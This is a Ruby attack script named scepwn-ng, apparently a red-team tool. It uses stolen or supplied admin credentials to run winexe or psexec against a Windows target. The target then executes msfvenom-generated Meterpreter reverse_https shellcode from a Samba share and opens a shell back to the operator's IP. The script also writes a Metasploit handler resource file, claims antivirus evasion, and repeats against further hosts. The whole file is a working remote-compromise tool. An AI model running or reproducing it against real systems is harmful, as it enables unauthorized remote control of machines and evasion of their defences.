#!/usr/bin/env ruby
# 
# scepwn-ng is a wrapper script for launching winexe/psexec at a target, which then runs 
# shellcode exec from a samba share with a msf generated reverse shell. As the executable
# never touches disk, it is highly effective at evading a/v. 
#
# Local admin is required for winexe/psexec to start their respective service, and should be
# considered a prerequisite for using this tool. 


require 'optparse'
require 'fileutils'

VERSION='3.0.2'


## ~~~~~~~ CONFIG - WHERE ARE YOUR TOOLS ~~~~~~ ##

WINEXE = "/usr/bin/winexe" #Kali Default
PSEXEC = "/usr/local/bin/psexec.py" #Default location for impackets installer
SCE = "/opt/shellcodeexec/windows/shellcodeexec.x32.exe" #If you followed the setup above, this is good. Otherwise, set to the location of shellcodeexec


## ~~~~~~~ CONFIG - IF YOU HAVE ALREADY CONFIGURED SAMBA ~ UPDATE THE SMB_SHARE VARIABLES TO MATCH YOUR SETUP ~~~~~~ ##

SMB_SHARE_NAME = "sce_share" # As configured in /etc/samba/smb.conf
SMB_SHARE_LOC = "/var/sce_share" # Must be readable


SCE_NAME = SCE.split('/').last # Grabs ShellCodeExec filename from path listed in SCE. Filename must match what is in samba share
DEF_RC_FILE = "/root/.msf4/scepwn.rc" # A location where we can write a metasploit resource file


class String #Define colors without requiring additional gems
	def black;          "\033[30m#{self}\033[0m" end
	def red;            "\033[31m#{self}\033[0m" end
	def green;          "\033[32m#{self}\033[0m" end
	def brown;          "\033[33m#{self}\033[0m" end
	def blue;           "\033[34m#{self}\033[0m" end
	def magenta;        "\033[35m#{self}\033[0m" end
	def cyan;           "\033[36m#{self}\033[0m" end
	def gray;           "\033[37m#{self}\033[0m" end
	def bg_black;       "\033[40m#{self}\033[0m" end
	def bg_red;         "\033[41m#{self}\033[0m" end
	def bg_green;       "\033[42m#{self}\033[0m" end
	def bg_brown;       "\033[43m#{self}\033[0m" end
	def bg_blue;        "\033[44m#{self}\033[0m" end
	def bg_magenta;     "\033[45m#{self}\033[0m" end
	def bg_cyan;        "\033[46m#{self}\033[0m" end
	def bg_gray;        "\033[47m#{self}\033[0m" end
	def bold;           "\033[1m#{self}\033[22m" end
	def reverse_color;  "\033[7m#{self}\033[27m" end
end


options = {:port => "443", :service => "winexe"} #Set default values
parser = OptionParser.new do |opts| 
	opts.banner = "scepwn-ng v#{VERSION} - By Joshua Skorich (@TheJoSko)
	\nUsage: scepwn-ng.rb [options]"
	opts.on( '-t', '--target TARGET', "Target IP address" ) do |target|
		options[:target] = target;
	end
	opts.on( '-u', '--user CREDENTIALS', "Credentials in DOMAIN/USERNAME%PASSWORD format" ) do |user|
		options[:user] = user;
	end
	opts.on( '-p', '--port PORT', "Reverse shell port number (default: #{options[:port]})" ) do |port|
		options[:port] = port;
	end
	opts.on( '-s', '--service SERVICE', "winexe or psexec (default: #{options[:service]})" ) do |service|
		options[:service] = service;
	end
	opts.on( '-h', '--help', "Display this screen" ) do
		puts opts
		exit
	end
end


parser.parse!


# Create global variables for input options, and allows them to be changed through execution
$target = options[:target]
$user = options[:user]
$port = options[:port]
$service = options[:service]


# Create the creds_array to hold all inputed credentials
$creds_array = Array.new
$creds_array.push "Enter credentials in DOMAIN\\username%password format: "
if $user
	$creds_array.push $user
end


# Create the targets_array to hold all the inputed targets
$targets_array = Array.new
$targets_array.push "Enter target IP address: "
if $target
	$targets_array.push $target
end


# Create the services_array
$services_array = Array.new
$services_array.push "winexe"
$services_array.push "psexec"


# Create the ports_array
$ports_array = Array.new
$ports_array.push "Enter the reverse shell port: "
$ports_array.push $port


#OS Check and auto detection of IP address
if RUBY_PLATFORM =~ /linux/
	DEF_INT = `route -n | grep 'UG ' | grep -v tun0 | awk '{print $8}'`
	DEF_INT_IP = `ifconfig $DEF_INT | grep 'inet ' | awk '{print $2}' | cut -d':' -f 2 | cut -d'\n' -f 1`.tr("\n","")
	#Need to add check for alternate package names on various OSes
	$smbd_service = "samba"
	$nmbd_service = "samba"
else
	puts "[x]".red + "\t FATAL ERROR: scepwn-ng is currently only designed for linux"
	exit
end


# Read credentials if none supplied at runtime, or for "pwn another host"
def read_creds
	if $creds_array[1].nil?
		print "Enter credentials in DOMAIN\\username%password format: "
		$creds_array.push gets.chomp
		$user = $creds_array[$creds_array.length - 1]
	else
		puts "[?]".blue + "Select credentials: "
		$creds_array.each_with_index do |value, index|
			puts "#{index} : #{value}"
		end
		print "[?]".blue + "Which credentials should we use (default: 0)? "
		creds = gets.to_i
		if creds == 0 or creds.nil?
			print "Enter credentials in DOMAIN\\username%password format: "
			$creds_array.push gets.chomp
			$user = $creds_array[$creds_array.length - 1]
		else
			$user = $creds_array[creds]
		end
	end
end


# Read target if none supplied at runtime, or for "pwn another host"
def read_targets
	if $targets_array[1].nil?
		print "Enter target IP address: "
		$targets_array.push gets.chomp
		$target = $targets_array[$targets_array.length - 1]
	else
		puts "[?]".blue + "Select target: "
		$targets_array.each_with_index do |value, index|
			puts "#{index} : #{value}"
		end
		print "[?]".blue + "Which target should we use (default: 0)? "
		target = gets.to_i
		if target == 0 or target.nil?
			print "Enter target IP address: "
			$targets_array.push gets.chomp
			$target = $targets_array[$targets_array.length - 1]
		else
			$target = $targets_array[target]
		end
	end
end


# Read service
def read_service
	puts "[?]".blue + "Select service: "
	$services_array.each_with_index do |value, index|
		puts "#{index} : #{value}"
	end
	print "[?]".blue + "Which service should we use (default: 0)? "
	$service = $services_array[gets.to_i]
end


# Read port
def read_port
	puts "[?]".blue + "Select port: "
	$ports_array.each_with_index do |value, index|
		puts "#{index} : #{value}"
	end
	print "[?]".blue + "Which port should we use (default: 0)? "
	port = gets.to_i
	if $ports_array[port] == $port
		return
	end
	if port == 0 or port.nil?
		print "Enter port: "
		$ports_array.push gets.chomp
		$port = $ports_array[$ports_array.length - 1]
	else
		$port = $ports_array[port]
	end
	generate_opcode
	generate_rc
	puts "[!]\t Be sure to reload msf for the port change: ".red + "msf> resource #{DEF_RC_FILE}".blue
end


# Check to see if Samba is running. If not, attempt to start. 
def samba_status(sce_share=nil)
	smbd_status = `service #{$smbd_service} status`
	nmbd_status = `service #{$nmbd_service} status`
	if sce_share.nil?
		puts "[+]\tChecking to see if Samba is running"
		if smbd_status !~ /smbd is running/
			puts "[x]".red + "\tThe Samba smbd service is not running"
			puts "[*]".green + "\tStarting the samba smbd service"
			smbd_start = `service #{$smbd_service} start`
		end
		if nmbd_status !~ /nmbd is running/
			puts "[x]".red + "\tThe Samba nmbd service is not running"
			puts "[*]".green + "\tStarting the samba nmbd service"
			nmbd_start = `service #{$nmbd_service} start`
		end
		#need to figure this shit out. How to reload values. Perhaps a seperate function to call. 
		smbd_status = `service #{$smbd_service} status`
		nmbd_status = `service #{$nmbd_service} status`
		if smbd_status !~ /smbd is running/ or nmbd_status !~ /nmbd is running/
			puts "[x]".red + "\tFATAL ERROR: The Samba service could not be started"
			exit
		else
			puts "[*]".green + "\tSamba is running"
		end
	else
		smbd_restart = `service #{$smbd_service} restart`
		if $nmbd_service != $smbd_service
			nmbd_restart = `service #{$nmbd_service} restart`
		end
		smbd_status = `service #{$smbd_service} status`
		nmbd_status = `service #{$nmbd_service} status`
		if smbd_status !~ /smbd is running/ or nmbd_status !~ /nmbd is running/
			puts "[x]".red + "\tFATAL ERROR: The Samba service could not be started"
			exit
		else
			puts "[*]".green + "\tSamba restarted "
		end
	end
end


# Enumerate all defined shares in /etc/samba/smb.conf and check to see if SCE_NAME is accessible
def samba_check(sce_share=nil)
	if sce_share.nil?
		puts "[+]\tChecking all shares defined in /etc/samba/smb.conf for #{SCE_NAME}"
		shares = File.readlines('/etc/samba/smb.conf').select { |share| share[/^\[.*\]/m] }
	else
		shares = Array[sce_share]
	end
	shares.each { |share|
		share = share.delete "[]\n"
		puts "[+]\tChecking #{share} share"
		def_smb_check = `smbclient -N -g --command=dir //localhost/#{share}/ 2>&1 | grep #{SCE_NAME}`
		if def_smb_check.empty?
			puts "[x]".red + "\tCan't find #{SCE_NAME} on //localhost/#{share}"
			$sce_share = nil
		else
			puts "[*]".green + "\t//localhost/#{share} is hot and serving #{SCE_NAME}, good to go"
			$sce_share = share
			break
		end	
	}
	if $sce_share.nil?
		print "[?]".blue + "\tWould you like to setup the samba share automagically?: (y/N) "
		reply = gets.chomp
		if reply =~ /[Yy]/ 
			samba_setup
		else
			puts "[x]".red + "\tFATAL ERROR: #{SCE_NAME} was not found accessible on any samba share. Setup samba manually and start over..."
			exit
		end
	end
end


# Create a new share in the smb.conf as declared in SMB_SHARE_NAME, and copy files to the location setup in SMB_SHARE_LOC
def samba_setup
	if File.open('/etc/samba/smb.conf').read() !~ /^\[#{SMB_SHARE_NAME}\]/
		puts "[*]".green + "\tCreating #{SMB_SHARE_NAME} in samba config"
		open('/etc/samba/smb.conf', 'a') { |f|
			f.puts "[#{SMB_SHARE_NAME}]"
			f.puts "\tbrowseable = no"
			f.puts "\tpath = #{SMB_SHARE_LOC}"
			f.puts "\tguest ok = yes"
			f.puts "\tread only = no"
			f.puts "\tcreate mask = 0600"
			f.puts "\tdirectory mask = 0700"
		}
	else
		puts "[*]".green + "\t#{SMB_SHARE_NAME} share already defined in samba config ..."
	end
	if File.directory? SMB_SHARE_LOC
		puts "[+]\tCopying #{SCE_NAME} to #{SMB_SHARE_LOC}"
		FileUtils.cp SCE, SMB_SHARE_LOC
	else
		puts "[+]\tCreating #{SMB_SHARE_LOC} directory"
		Dir.mkdir(SMB_SHARE_LOC, 0755)
		puts "[+]\tCopying #{SCE_NAME} to #{SMB_SHARE_LOC}"
		FileUtils.cp SCE, SMB_SHARE_LOC
	end
	samba_status(SMB_SHARE_NAME)
	samba_check(SMB_SHARE_NAME)
end


# Generates the alphanumeric msf payload
def generate_opcode
	puts "[*]".green + "\tGenerating reverse_https opcode for sce using " + DEF_INT_IP.green + " as LHOST and port " + $port.green
	$def_opcode = `msfvenom -p windows/meterpreter/reverse_https EXITFUNC=thread LPORT=#{$port} LHOST=#{DEF_INT_IP} -f raw -a x86 -e x86/alpha_mixed --platform windows BufferRegister=EAX`
	p $def_opcode
end

# Generates the msf resource file
def generate_rc
	puts "[*]".green + "\tCreating msf resource file"
	open(DEF_RC_FILE, 'w') { |f|
		f.puts "use exploit/multi/handler"
		f.puts "set PAYLOAD windows/meterpreter/reverse_https"
		f.puts "set EXITFUNC thread"
		f.puts "set LPORT #{$port}"
		f.puts "set LHOST #{DEF_INT_IP}"
		f.puts "set ExitOnSession false"
		f.puts "exploit -j -z"
	}
end


# Pwnage and repeat/exit
def pwn
	puts "\n########################################################################################"
	puts "#####   In a separate screen, launch:      " + "msfconsole -r #{DEF_RC_FILE}".green + "     #####"
	puts "#####                                                                              #####"
	puts "#####   If msf chokes on itself, reload the resource file:                         #####"
	puts "#####                                      msf> " + "resource #{DEF_RC_FILE}".blue + "     #####"
	puts "########################################################################################"
	puts "\tMake sure you have multi handler up to catch shells (see above)."
	print "Press " + "[Enter]" + " key to start pwning..."
	go = gets
	puts "[*]".green + "#{$service}'ing to:"
	puts "    target:      #{$target}"
	puts "    credentials: #{$user}"
	puts "    port:        #{$port}"
	if $service == "winexe"
		exploit = system("#{WINEXE} --system --uninstall -U '#{$user}' //#{$target} 'cmd /c \\\\#{DEF_INT_IP}\\#{$sce_share}\\#{SCE_NAME} #{$def_opcode}'")
	elsif $service == "psexec"
		$psexec_creds = $user.split('%')
		exploit = system("#{PSEXEC} #{$psexec_creds.first}:#{$psexec_creds.last}@#{$target} cmd 'cmd /c \\\\#{DEF_INT_IP}\\#{$sce_share}\\#{SCE_NAME} #{$def_opcode}'")
	end
	print "[?]".green + "Pwn again (y/N):"
	reply = gets.chomp
	if reply =~ /[Yy]/ 
		read_creds
		read_targets
		read_service
		read_port
	else
		puts "[x]".red + "\tExiting..."
		exit
	end
	pwn
end


# Required values
if options[:user].nil?
	read_creds
end

if options[:target].nil?
	read_targets
end


# Main operation
samba_status
samba_check
generate_opcode
generate_rc
pwn
